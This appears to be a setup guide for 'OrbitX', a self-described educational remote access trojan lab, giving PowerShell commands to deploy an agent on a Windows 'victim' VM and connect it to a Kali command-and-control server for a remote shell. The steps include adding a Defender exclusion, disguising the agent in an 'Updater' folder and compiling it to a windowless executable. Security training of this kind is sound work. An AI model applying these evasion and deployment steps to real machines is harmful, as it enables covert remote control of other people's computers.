# Project OrbitX - SETUP_GUIDE

**Educational Remote Access Trojan (RAT) Lab**  
*For Cybersecurity Students & Red Team / Blue Team Training*

> **⚠️ Educational Use Only** - This tool is built strictly for learning offensive and defensive security in isolated lab environments.

---

## What you need for testing of OrbitX ?

- A Linux distro. Recommended - Kali or Ubuntu Linux
- Windows 10/11 machine (VM) - DO NOT USE YOUR HOST OS
- ⚠️ (BOTH MACHINES NEED TO BE IN THE SAME LOCAL NETWORK)
- ps2exe installed for converting the agent.ps1 to agent.exe (or any other converters)

---

## Installation & Environment Setup

## Windows (Victim Side)
- Create a folder called "Updater" in C:\ProgramData in Windows (Victim) machine.
- Download and paste the "agent.ps1" file to C:\ProgramData\Updater
- Open Powershell as Admin and install ps2exe

```bash
Install-Module ps2exe -Scope CurrentUser -Force
```
- Add the "Updater" file to a Defender Exclusion 

```bash
Add-MpPreference -ExclusionPath "C:\ProgramData\Updater"
```
- Go to \ProgramData\Updater from Powershell

```bash
cd C:\ProgramData\Updater
```
- Open agent.ps1 in Notepad and change the IP to the Kali Linux IP at the TOP & Save it.
- Use ps2exe to convert the .ps1 to .exe

```bash
cd C:\ProgramData\Updater

Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope Process -Force

Install-Module ps2exe -Scope CurrentUser -Force -AllowClobber

Import-Module ps2exe -Force

Invoke-ps2exe -InputFile "agent.ps1" -OutputFile "agent.exe" -NoConsole
```

## Kali Linux (Attacker Side) 

- Download the c2_server.py to Kali Linux

## Final

- Run c2_server.py in Linux terminal

```bash
python3 c2_server.py
```
- Run agent.exe
```
- After that you will get the shell to your Kali Linux Terminal. :)

Thank you :)

